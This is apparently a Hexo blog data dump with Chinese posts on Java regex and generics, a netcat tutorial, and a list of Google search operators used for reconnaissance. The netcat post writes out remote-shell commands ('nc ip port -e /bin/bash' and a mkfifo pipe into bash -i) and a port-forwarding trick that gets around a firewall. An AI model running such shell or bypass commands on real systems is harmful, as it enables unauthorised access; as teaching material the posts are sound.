class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String zz1 = &quot;(\\\\d&#123;11&#125;,)&#123;1,3&#125;\\\\d&#123;11&#125;&quot;;</span><br><span class=\"line\">String str1 = &quot;17888824094,17888824094,17888824094&quot;;</span><br><span class=\"line\">boolean isTrue1 = Pattern.matches(zz1, str1);</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n"},{"title":"泛型","date":"2018-11-15T16:41:40.000Z","_content":"\n#### 1. <T\\>\n泛型<T> T可以为任意大写字母<br>\n可以多泛型<T,U>等<br>\n单独的<T>表示T为Object下的子类。<br>\n\n类型绑定: <T extends XXX> 表示T为继承XXX类型的子类<br>\n\n#### 2.例子\n\n###### 1.泛型类\n```\npublic class GenericDemo <T>{\n    public   T test(T t){\n        return t;\n    }\n\n    public static void main(String[] args){\n        GenericDemo<String> genericDemo = new GenericDemo<>();\n        System.out.println(genericDemo.test(\"aa\"));\n    }\n}\n\n```\n###### 2.泛型方法\n```\npublic class GenericMethod {\n    public static <T> T test(T t) {\n        return t;\n    }\n    public static  void  main(String[] args) {\n        System.out.println(test(\"aa\"));\n    }\n}\n\n```\n###### 3.泛型接口\n```\npublic interface GenericInterface <T,U> {\n    T test(U u);\n}\n\n\npublic class GenericInterfaceClass implements GenericInterface<String,String>{\n    @Override\n    public String test(String a){\n        return a;\n    }\n}\n\n```\n","source":"_posts/java/泛型.md","raw":"---\ntitle: 泛型\ndate: 2018-11-15 11:41:40\ntags: [java]\n---\n\n#### 1. <T\\>\n泛型<T> T可以为任意大写字母<br>\n可以多泛型<T,U>等<br>\n单独的<T>表示T为Object下的子类。<br>\n\n类型绑定: <T extends XXX> 表示T为继承XXX类型的子类<br>\n\n#### 2.例子\n\n###### 1.泛型类\n```\npublic class GenericDemo <T>{\n    public   T test(T t){\n        return t;\n    }\n\n    public static void main(String[] args){\n        GenericDemo<String> genericDemo = new GenericDemo<>();\n        System.out.println(genericDemo.test(\"aa\"));\n    }\n}\n\n```\n###### 2.泛型方法\n```\npublic class GenericMethod {\n    public static <T> T test(T t) {\n        return t;\n    }\n    public static  void  main(String[] args) {\n        System.out.println(test(\"aa\"));\n    }\n}\n\n```\n###### 3.泛型接口\n```\npublic interface GenericInterface <T,U> {\n    T test(U u);\n}\n\n\npublic class GenericInterfaceClass implements GenericInterface<String,String>{\n    @Override\n    public String test(String a){\n        return a;\n    }\n}\n\n```\n","slug":"java/泛型","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ia001r6dcp0qzcon71","content":"<h4 id=\"1-lt-T\"><a href=\"#1-lt-T\" class=\"headerlink\" title=\"1. &lt;T>\"></a>1. &lt;T></h4><p>泛型<t> T可以为任意大写字母<br><br>可以多泛型&lt;T,U&gt;等<br><br>单独的<t>表示T为Object下的子类。<br></t></t></p>\n<p>类型绑定: <t extends=\"\" xxx=\"\"> 表示T为继承XXX类型的子类<br></t></p>\n<h4 id=\"2-例子\"><a href=\"#2-例子\" class=\"headerlink\" title=\"2.例子\"></a>2.例子</h4><h6 id=\"1-泛型类\"><a href=\"#1-泛型类\" class=\"headerlink\" title=\"1.泛型类\"></a>1.泛型类</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class GenericDemo &lt;T&gt;&#123;</span><br><span class=\"line\">    public   T test(T t)&#123;</span><br><span class=\"line\">        return t;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        GenericDemo&lt;String&gt; genericDemo = new GenericDemo&lt;&gt;();</span><br><span class=\"line\">        System.out.println(genericDemo.test(&quot;aa&quot;));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"2-泛型方法\"><a href=\"#2-泛型方法\" class=\"headerlink\" title=\"2.泛型方法\"></a>2.泛型方法</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class GenericMethod &#123;</span><br><span class=\"line\">    public static &lt;T&gt; T test(T t) &#123;</span><br><span class=\"line\">        return t;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public static  void  main(String[] args) &#123;</span><br><span class=\"line\">        System.out.println(test(&quot;aa&quot;));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-泛型接口\"><a href=\"#3-泛型接口\" class=\"headerlink\" title=\"3.泛型接口\"></a>3.泛型接口</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public interface GenericInterface &lt;T,U&gt; &#123;</span><br><span class=\"line\">    T test(U u);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public class GenericInterfaceClass implements GenericInterface&lt;String,String&gt;&#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public String test(String a)&#123;</span><br><span class=\"line\">        return a;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-lt-T\"><a href=\"#1-lt-T\" class=\"headerlink\" title=\"1. &lt;T>\"></a>1. &lt;T></h4><p>泛型<t> T可以为任意大写字母<br><br>可以多泛型&lt;T,U&gt;等<br><br>单独的<t>表示T为Object下的子类。<br></t></t></p>\n<p>类型绑定: <t extends=\"\" xxx=\"\"> 表示T为继承XXX类型的子类<br></t></p>\n<h4 id=\"2-例子\"><a href=\"#2-例子\" class=\"headerlink\" title=\"2.例子\"></a>2.例子</h4><h6 id=\"1-泛型类\"><a href=\"#1-泛型类\" class=\"headerlink\" title=\"1.泛型类\"></a>1.泛型类</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class GenericDemo &lt;T&gt;&#123;</span><br><span class=\"line\">    public   T test(T t)&#123;</span><br><span class=\"line\">        return t;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        GenericDemo&lt;String&gt; genericDemo = new GenericDemo&lt;&gt;();</span><br><span class=\"line\">        System.out.println(genericDemo.test(&quot;aa&quot;));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"2-泛型方法\"><a href=\"#2-泛型方法\" class=\"headerlink\" title=\"2.泛型方法\"></a>2.泛型方法</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class GenericMethod &#123;</span><br><span class=\"line\">    public static &lt;T&gt; T test(T t) &#123;</span><br><span class=\"line\">        return t;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public static  void  main(String[] args) &#123;</span><br><span class=\"line\">        System.out.println(test(&quot;aa&quot;));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-泛型接口\"><a href=\"#3-泛型接口\" class=\"headerlink\" title=\"3.泛型接口\"></a>3.泛型接口</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public interface GenericInterface &lt;T,U&gt; &#123;</span><br><span class=\"line\">    T test(U u);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public class GenericInterfaceClass implements GenericInterface&lt;String,String&gt;&#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public String test(String a)&#123;</span><br><span class=\"line\">        return a;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"netcat","date":"2019-01-17T20:19:13.000Z","_content":"\nnetcat简称nc, 能通过tcp和udp在网络中读取数据。在两台电脑间建立连接，监听并返回两个数据流。\n\n#### 1.常用参数：\n```\n\t-4/6 使用IPv4/6地址\n\t-b 允许broadcast广播\n\t-c  发送CRLF（回车换行 Carriage-Return Line-Feed）当line-ending\n\t-d 不尝试读取stdin\n\t-I length 设置TCP接收的buffer的大小\n\t-i interval 设置发送和接收间的延迟秒数，\n\t-l 监听模式\n\t-n 直接使用ip,不通过域名服务器DNS查询域名\n\t-o length  设置TCP发送的buffer大小\n\t-P 代理名字\n\t-p nc使用的端口\n\t-v verbose更多输出信息\n\t-w timeout\n\t-u 使用UDP\n\t-r 随机选择端口\n\t-s source  设置本地主机送出数据包的IP地址\n```\n#### 2.使用例子\n#####\t1.建立连接，聊天\n\t\tnc -l port 在本地主机监听一个端口<br>\n\t\tnc ip port 在其它主机与之建立连接（默认TCP），发送消息\n#####\t2.端口扫描\n\t\t原理，进行tcp三次握手建立连接，如果成功则说明端口开放，容易被防火墙，IDS检测到<br>\n\t\tnc -v -n -z ip port(可以是范围)<br>\n\t\t\t-v进行详细输出<br>\n\t\t\t-n不进行域名查询<br>\n\t\t\t-z建立连接后关闭连接，不进行数据交换<br>\n#####\t3.数据传输(甚至可以传输流媒体）\n\t\t类似于聊天，只是将输入换成文件，使用重定向或者管道符<br>\n\t\tserver:  nc -l port < file1.txt<br>\n\t\tclien: nc -n ip port > file2txt<br>\n\t\tfile1往file2传数据<br>\n#####\t4.获取shell，正反向shell\n\t\t如果有-e参数，直接 nc ip port -e /bin/bash<br>\n\t\t无-e参数时:<br>\n\t\tserver:<br>\n\t\tmkfifo /tmp/fifo<br>\n\t\tcat /tmp/fifo | /bin/bash -i 2>&1 | nc -l port > /tmp/fifo<br>\n\t\tclient:<br>\n\t\tnc ip port<br>\n\t\t原理：<br>\n\t\tbash -i 进入交互模式<br>\n\t\t通过mkfifo 建立一个管道（命令管道）文件，将管道文件的内容通过匿名管道传给/bin/bash执行，然后再将nc监听到的输入写入fifo,形成一个循环\n\n#####\t5.端口转发\n\t\t- 背景：192.168.1.103的msfadmin用户需要访问192.168.1.102的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前msfadmin用户只能访问192.168.1.102的9000端口。需要9000端口做转发。\n\t\t- 目标：msfadmin通过访问192.168.1.102的9000端口，达到与8000端口通话的目的。\n\t\t原理：<br>\n\t\t在102上：nc -l 8000<br>\n\t\t\t\t\t  cat /tmp/fifo | nc localhost 8000 | nc -l 9000 > /tmp/fifo\n\t\t在103上：<br>\n\t\t\t\tnc 192.168.1.102 9000<br>\n\t\t在102主机上，开启要转发的8000端口，然后用9000端口通过接收数据，然后连接本地8000端口，将命令管道的数据通过匿名管道传给8000端口\n","source":"_posts/security/netcat.md","raw":"---\ntitle: netcat\ndate: 2019-01-17 15:19:13\ntags: [linux]\n---\n\nnetcat简称nc, 能通过tcp和udp在网络中读取数据。在两台电脑间建立连接，监听并返回两个数据流。\n\n#### 1.常用参数：\n```\n\t-4/6 使用IPv4/6地址\n\t-b 允许broadcast广播\n\t-c  发送CRLF（回车换行 Carriage-Return Line-Feed）当line-ending\n\t-d 不尝试读取stdin\n\t-I length 设置TCP接收的buffer的大小\n\t-i interval 设置发送和接收间的延迟秒数，\n\t-l 监听模式\n\t-n 直接使用ip,不通过域名服务器DNS查询域名\n\t-o length  设置TCP发送的buffer大小\n\t-P 代理名字\n\t-p nc使用的端口\n\t-v verbose更多输出信息\n\t-w timeout\n\t-u 使用UDP\n\t-r 随机选择端口\n\t-s source  设置本地主机送出数据包的IP地址\n```\n#### 2.使用例子\n#####\t1.建立连接，聊天\n\t\tnc -l port 在本地主机监听一个端口<br>\n\t\tnc ip port 在其它主机与之建立连接（默认TCP），发送消息\n#####\t2.端口扫描\n\t\t原理，进行tcp三次握手建立连接，如果成功则说明端口开放，容易被防火墙，IDS检测到<br>\n\t\tnc -v -n -z ip port(可以是范围)<br>\n\t\t\t-v进行详细输出<br>\n\t\t\t-n不进行域名查询<br>\n\t\t\t-z建立连接后关闭连接，不进行数据交换<br>\n#####\t3.数据传输(甚至可以传输流媒体）\n\t\t类似于聊天，只是将输入换成文件，使用重定向或者管道符<br>\n\t\tserver:  nc -l port < file1.txt<br>\n\t\tclien: nc -n ip port > file2txt<br>\n\t\tfile1往file2传数据<br>\n#####\t4.获取shell，正反向shell\n\t\t如果有-e参数，直接 nc ip port -e /bin/bash<br>\n\t\t无-e参数时:<br>\n\t\tserver:<br>\n\t\tmkfifo /tmp/fifo<br>\n\t\tcat /tmp/fifo | /bin/bash -i 2>&1 | nc -l port > /tmp/fifo<br>\n\t\tclient:<br>\n\t\tnc ip port<br>\n\t\t原理：<br>\n\t\tbash -i 进入交互模式<br>\n\t\t通过mkfifo 建立一个管道（命令管道）文件，将管道文件的内容通过匿名管道传给/bin/bash执行，然后再将nc监听到的输入写入fifo,形成一个循环\n\n#####\t5.端口转发\n\t\t- 背景：192.168.1.103的msfadmin用户需要访问192.168.1.102的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前msfadmin用户只能访问192.168.1.102的9000端口。需要9000端口做转发。\n\t\t- 目标：msfadmin通过访问192.168.1.102的9000端口，达到与8000端口通话的目的。\n\t\t原理：<br>\n\t\t在102上：nc -l 8000<br>\n\t\t\t\t\t  cat /tmp/fifo | nc localhost 8000 | nc -l 9000 > /tmp/fifo\n\t\t在103上：<br>\n\t\t\t\tnc 192.168.1.102 9000<br>\n\t\t在102主机上，开启要转发的8000端口，然后用9000端口通过接收数据，然后连接本地8000端口，将命令管道的数据通过匿名管道传给8000端口\n","slug":"security/netcat","published":1,"updated":"2019-10-13T12:15:12.180Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321id001t6dcpzz6vn93o","content":"<p>netcat简称nc, 能通过tcp和udp在网络中读取数据。在两台电脑间建立连接，监听并返回两个数据流。</p>\n<h4 id=\"1-常用参数：\"><a href=\"#1-常用参数：\" class=\"headerlink\" title=\"1.常用参数：\"></a>1.常用参数：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-4/6 使用IPv4/6地址</span><br><span class=\"line\">-b 允许broadcast广播</span><br><span class=\"line\">-c  发送CRLF（回车换行 Carriage-Return Line-Feed）当line-ending</span><br><span class=\"line\">-d 不尝试读取stdin</span><br><span class=\"line\">-I length 设置TCP接收的buffer的大小</span><br><span class=\"line\">-i interval 设置发送和接收间的延迟秒数，</span><br><span class=\"line\">-l 监听模式</span><br><span class=\"line\">-n 直接使用ip,不通过域名服务器DNS查询域名</span><br><span class=\"line\">-o length  设置TCP发送的buffer大小</span><br><span class=\"line\">-P 代理名字</span><br><span class=\"line\">-p nc使用的端口</span><br><span class=\"line\">-v verbose更多输出信息</span><br><span class=\"line\">-w timeout</span><br><span class=\"line\">-u 使用UDP</span><br><span class=\"line\">-r 随机选择端口</span><br><span class=\"line\">-s source  设置本地主机送出数据包的IP地址</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-使用例子\"><a href=\"#2-使用例子\" class=\"headerlink\" title=\"2.使用例子\"></a>2.使用例子</h4><h5 id=\"1-建立连接，聊天\"><a href=\"#1-建立连接，聊天\" class=\"headerlink\" title=\"1.建立连接，聊天\"></a>1.建立连接，聊天</h5><pre><code>nc -l port 在本地主机监听一个端口&lt;br&gt;\nnc ip port 在其它主机与之建立连接（默认TCP），发送消息\n</code></pre><h5 id=\"2-端口扫描\"><a href=\"#2-端口扫描\" class=\"headerlink\" title=\"2.端口扫描\"></a>2.端口扫描</h5><pre><code>原理，进行tcp三次握手建立连接，如果成功则说明端口开放，容易被防火墙，IDS检测到&lt;br&gt;\nnc -v -n -z ip port(可以是范围)&lt;br&gt;\n    -v进行详细输出&lt;br&gt;\n    -n不进行域名查询&lt;br&gt;\n    -z建立连接后关闭连接，不进行数据交换&lt;br&gt;\n</code></pre><h5 id=\"3-数据传输-甚至可以传输流媒体）\"><a href=\"#3-数据传输-甚至可以传输流媒体）\" class=\"headerlink\" title=\"3.数据传输(甚至可以传输流媒体）\"></a>3.数据传输(甚至可以传输流媒体）</h5><pre><code>类似于聊天，只是将输入换成文件，使用重定向或者管道符&lt;br&gt;\nserver:  nc -l port &lt; file1.txt&lt;br&gt;\nclien: nc -n ip port &gt; file2txt&lt;br&gt;\nfile1往file2传数据&lt;br&gt;\n</code></pre><h5 id=\"4-获取shell，正反向shell\"><a href=\"#4-获取shell，正反向shell\" class=\"headerlink\" title=\"4.获取shell，正反向shell\"></a>4.获取shell，正反向shell</h5><pre><code>如果有-e参数，直接 nc ip port -e /bin/bash&lt;br&gt;\n无-e参数时:&lt;br&gt;\nserver:&lt;br&gt;\nmkfifo /tmp/fifo&lt;br&gt;\ncat /tmp/fifo | /bin/bash -i 2&gt;&amp;1 | nc -l port &gt; /tmp/fifo&lt;br&gt;\nclient:&lt;br&gt;\nnc ip port&lt;br&gt;\n原理：&lt;br&gt;\nbash -i 进入交互模式&lt;br&gt;\n通过mkfifo 建立一个管道（命令管道）文件，将管道文件的内容通过匿名管道传给/bin/bash执行，然后再将nc监听到的输入写入fifo,形成一个循环\n</code></pre><h5 id=\"5-端口转发\"><a href=\"#5-端口转发\" class=\"headerlink\" title=\"5.端口转发\"></a>5.端口转发</h5><pre><code>- 背景：192.168.1.103的msfadmin用户需要访问192.168.1.102的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前msfadmin用户只能访问192.168.1.102的9000端口。需要9000端口做转发。\n- 目标：msfadmin通过访问192.168.1.102的9000端口，达到与8000端口通话的目的。\n原理：&lt;br&gt;\n在102上：nc -l 8000&lt;br&gt;\n              cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo\n在103上：&lt;br&gt;\n        nc 192.168.1.102 9000&lt;br&gt;\n在102主机上，开启要转发的8000端口，然后用9000端口通过接收数据，然后连接本地8000端口，将命令管道的数据通过匿名管道传给8000端口\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>netcat简称nc, 能通过tcp和udp在网络中读取数据。在两台电脑间建立连接，监听并返回两个数据流。</p>\n<h4 id=\"1-常用参数：\"><a href=\"#1-常用参数：\" class=\"headerlink\" title=\"1.常用参数：\"></a>1.常用参数：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-4/6 使用IPv4/6地址</span><br><span class=\"line\">-b 允许broadcast广播</span><br><span class=\"line\">-c  发送CRLF（回车换行 Carriage-Return Line-Feed）当line-ending</span><br><span class=\"line\">-d 不尝试读取stdin</span><br><span class=\"line\">-I length 设置TCP接收的buffer的大小</span><br><span class=\"line\">-i interval 设置发送和接收间的延迟秒数，</span><br><span class=\"line\">-l 监听模式</span><br><span class=\"line\">-n 直接使用ip,不通过域名服务器DNS查询域名</span><br><span class=\"line\">-o length  设置TCP发送的buffer大小</span><br><span class=\"line\">-P 代理名字</span><br><span class=\"line\">-p nc使用的端口</span><br><span class=\"line\">-v verbose更多输出信息</span><br><span class=\"line\">-w timeout</span><br><span class=\"line\">-u 使用UDP</span><br><span class=\"line\">-r 随机选择端口</span><br><span class=\"line\">-s source  设置本地主机送出数据包的IP地址</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-使用例子\"><a href=\"#2-使用例子\" class=\"headerlink\" title=\"2.使用例子\"></a>2.使用例子</h4><h5 id=\"1-建立连接，聊天\"><a href=\"#1-建立连接，聊天\" class=\"headerlink\" title=\"1.建立连接，聊天\"></a>1.建立连接，聊天</h5><pre><code>nc -l port 在本地主机监听一个端口&lt;br&gt;\nnc ip port 在其它主机与之建立连接（默认TCP），发送消息\n</code></pre><h5 id=\"2-端口扫描\"><a href=\"#2-端口扫描\" class=\"headerlink\" title=\"2.端口扫描\"></a>2.端口扫描</h5><pre><code>原理，进行tcp三次握手建立连接，如果成功则说明端口开放，容易被防火墙，IDS检测到&lt;br&gt;\nnc -v -n -z ip port(可以是范围)&lt;br&gt;\n    -v进行详细输出&lt;br&gt;\n    -n不进行域名查询&lt;br&gt;\n    -z建立连接后关闭连接，不进行数据交换&lt;br&gt;\n</code></pre><h5 id=\"3-数据传输-甚至可以传输流媒体）\"><a href=\"#3-数据传输-甚至可以传输流媒体）\" class=\"headerlink\" title=\"3.数据传输(甚至可以传输流媒体）\"></a>3.数据传输(甚至可以传输流媒体）</h5><pre><code>类似于聊天，只是将输入换成文件，使用重定向或者管道符&lt;br&gt;\nserver:  nc -l port &lt; file1.txt&lt;br&gt;\nclien: nc -n ip port &gt; file2txt&lt;br&gt;\nfile1往file2传数据&lt;br&gt;\n</code></pre><h5 id=\"4-获取shell，正反向shell\"><a href=\"#4-获取shell，正反向shell\" class=\"headerlink\" title=\"4.获取shell，正反向shell\"></a>4.获取shell，正反向shell</h5><pre><code>如果有-e参数，直接 nc ip port -e /bin/bash&lt;br&gt;\n无-e参数时:&lt;br&gt;\nserver:&lt;br&gt;\nmkfifo /tmp/fifo&lt;br&gt;\ncat /tmp/fifo | /bin/bash -i 2&gt;&amp;1 | nc -l port &gt; /tmp/fifo&lt;br&gt;\nclient:&lt;br&gt;\nnc ip port&lt;br&gt;\n原理：&lt;br&gt;\nbash -i 进入交互模式&lt;br&gt;\n通过mkfifo 建立一个管道（命令管道）文件，将管道文件的内容通过匿名管道传给/bin/bash执行，然后再将nc监听到的输入写入fifo,形成一个循环\n</code></pre><h5 id=\"5-端口转发\"><a href=\"#5-端口转发\" class=\"headerlink\" title=\"5.端口转发\"></a>5.端口转发</h5><pre><code>- 背景：192.168.1.103的msfadmin用户需要访问192.168.1.102的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前msfadmin用户只能访问192.168.1.102的9000端口。需要9000端口做转发。\n- 目标：msfadmin通过访问192.168.1.102的9000端口，达到与8000端口通话的目的。\n原理：&lt;br&gt;\n在102上：nc -l 8000&lt;br&gt;\n              cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo\n在103上：&lt;br&gt;\n        nc 192.168.1.102 9000&lt;br&gt;\n在102主机上，开启要转发的8000端口，然后用9000端口通过接收数据，然后连接本地8000端口，将命令管道的数据通过匿名管道传给8000端口\n</code></pre>"},{"title":"googlehacking","date":"2018-10-10T09:24:40.000Z","_content":"\n#### 1.GooleHacking\n利用搜索引擎的强大搜索能力，针对性的全网搜集所需资料。<br>\n\n\n#### 2.关键字\n- intext/allintext: 在正文中搜索\n- intitle/allintitle: 网页标题中， 例:intitle:后台管理，有很多\n- cache: 缓存中？？\n- filetype: 文件类型,   例:信息安全 filetype:doc\n- info: 摘要信息\n- inurl/allinurl: 在网址中\n- site: 域名，返回域名中的所有url地址，用于检查网站拓扑结构。 例: site: baidu.com\n- related: 搜索相关站点。  例:related:pku.edu.cn\n- inanchor: 在链接文本中搜索。 例：inanchor:pku.edu.cn\n- author: 新闻组贴子的作者。例:在google scholar搜索作者. author:\"John\"\n- datarange: 某个日期范围内的网页.格式为天文学儒掠日。例：”Geri Halliwell” “Spice Girls” daterange:2450958-2450968\n- weather: 天气. 例: weather:beijing\n- group:\n- stocks: 股票信息。 例:stocks:alibaba\n- define:显示某术语定义。例:define:网络安全\n- phonebook: 电话列表？？。 rphonebook:住宅电话 ; bphonebook:商业电话\n- link：搜索与当前网页存在链接的网页（不能与其他操作符或搜索关键字混合使用. 例：link:www.vvv518.com\n- msgid: 通过消息id搜索\n\n#### 3.语法\n- \"\" 精确操作\n- 关键字之间不需要间隔，空格代表逻辑与操作\n- \\- 忽略某个关键词. 例:a-b 搜索有a没b的网页\n- ～ 同义词\n- \\+ 加入被忽略的关键字。google对com等频率高的英文单词做了忽略处理，加上 + ，使之强制搜索。\n- 布尔and/or/not 例：aorb\n- 通配符，出现通配符的关键字需要用引号。\\*多个， ？和 . 单个\n\n#### 4.注意\n  1. google只能32个单词查询。<br>\n  2. 操作符、冒号、关键字之间是没有空格的。\n  3. 高级操作符能够和单独的查询混合使用\n\n#### 5.例子\n","source":"_posts/security/googlehacking.md","raw":"---\ntitle: googlehacking\ndate: 2018-10-10 05:24:40\ntags: [security]\n---\n\n#### 1.GooleHacking\n利用搜索引擎的强大搜索能力，针对性的全网搜集所需资料。<br>\n\n\n#### 2.关键字\n- intext/allintext: 在正文中搜索\n- intitle/allintitle: 网页标题中， 例:intitle:后台管理，有很多\n- cache: 缓存中？？\n- filetype: 文件类型,   例:信息安全 filetype:doc\n- info: 摘要信息\n- inurl/allinurl: 在网址中\n- site: 域名，返回域名中的所有url地址，用于检查网站拓扑结构。 例: site: baidu.com\n- related: 搜索相关站点。  例:related:pku.edu.cn\n- inanchor: 在链接文本中搜索。 例：inanchor:pku.edu.cn\n- author: 新闻组贴子的作者。例:在google scholar搜索作者. author:\"John\"\n- datarange: 某个日期范围内的网页.格式为天文学儒掠日。例：”Geri Halliwell” “Spice Girls” daterange:2450958-2450968\n- weather: 天气. 例: weather:beijing\n- group:\n- stocks: 股票信息。 例:stocks:alibaba\n- define:显示某术语定义。例:define:网络安全\n- phonebook: 电话列表？？。 rphonebook:住宅电话 ; bphonebook:商业电话\n- link：搜索与当前网页存在链接的网页（不能与其他操作符或搜索关键字混合使用. 例：link:www.vvv518.com\n- msgid: 通过消息id搜索\n\n#### 3.语法\n- \"\" 精确操作\n- 关键字之间不需要间隔，空格代表逻辑与操作\n- \\- 忽略某个关键词. 例:a-b 搜索有a没b的网页\n- ～ 同义词\n- \\+ 加入被忽略的关键字。google对com等频率高的英文单词做了忽略处理，加上 + ，使之强制搜索。\n- 布尔and/or/not 例：aorb\n- 通配符，出现通配符的关键字需要用引号。\\*多个， ？和 . 单个\n\n#### 4.注意\n  1. google只能32个单词查询。<br>\n  2. 操作符、冒号、关键字之间是没有空格的。\n  3. 高级操作符能够和单独的查询混合使用\n\n#### 5.例子\n","slug":"security/googlehacking","published":1,"updated":"2019-10-13T12:15:12.180Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ie001w6dcpx17hgb6p","content":"<h4 id=\"1-GooleHacking\"><a href=\"#1-GooleHacking\" class=\"headerlink\" title=\"1.GooleHacking\"></a>1.GooleHacking</h4><p>利用搜索引擎的强大搜索能力，针对性的全网搜集所需资料。<br></p>\n<h4 id=\"2-关键字\"><a href=\"#2-关键字\" class=\"headerlink\" title=\"2.关键字\"></a>2.关键字</h4><ul>\n<li>intext/allintext: 在正文中搜索</li>\n<li>intitle/allintitle: 网页标题中， 例:intitle:后台管理，有很多</li>\n<li>cache: 缓存中？？</li>\n<li>filetype: 文件类型,   例:信息安全 filetype:doc</li>\n<li>info: 摘要信息</li>\n<li>inurl/allinurl: 在网址中</li>\n<li>site: 域名，返回域名中的所有url地址，用于检查网站拓扑结构。 例: site: baidu.com</li>\n<li>related: 搜索相关站点。  例:related:pku.edu.cn</li>\n<li>inanchor: 在链接文本中搜索。 例：inanchor:pku.edu.cn</li>\n<li>author: 新闻组贴子的作者。例:在google scholar搜索作者. author:”John”</li>\n<li>datarange: 某个日期范围内的网页.格式为天文学儒掠日。例：”Geri Halliwell” “Spice Girls” 